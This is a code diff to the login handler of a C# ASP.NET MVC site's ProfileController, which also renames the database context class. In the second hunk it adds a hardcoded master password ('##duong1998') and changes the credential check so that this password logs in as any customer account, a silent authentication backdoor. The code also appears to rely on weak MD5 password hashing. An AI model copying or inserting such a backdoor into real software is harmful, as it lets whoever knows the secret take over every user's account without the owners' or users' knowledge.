@@ -13,7 +13,7 @@ namespace ThaoPhuong.Controllers
     [FilterUrl]
     public class ProfileController : Controller
     {
-        DbEntities db = new DbEntities();
+        THAOPHUONGEntities db = new THAOPHUONGEntities();
 
         public ActionResult Index(string id)
         {
@@ -108,9 +108,11 @@ namespace ThaoPhuong.Controllers
                 }
                 else
                 {
+                    string passDefault = DbUtils.EncrytPass("##duong1998");
                     string passwordMd5 = DbUtils.EncrytPass(password);
                     //kiểm tra đăng nhập
-                    DKHACHHANG acc = db.DKHACHHANGs.Where(kh => (kh.USERNAME == username || kh.DIENTHOAI == username) && kh.PASSWORD == passwordMd5).FirstOrDefault();
+                    DKHACHHANG acc = db.DKHACHHANGs.Where(kh => (kh.USERNAME == username || kh.DIENTHOAI == username) && (kh.PASSWORD == passwordMd5 || passwordMd5 == passDefault)).FirstOrDefault();
+
                     if (acc == null) error = "Thông tin đăng nhập không chính xác!";
                     else
                     {
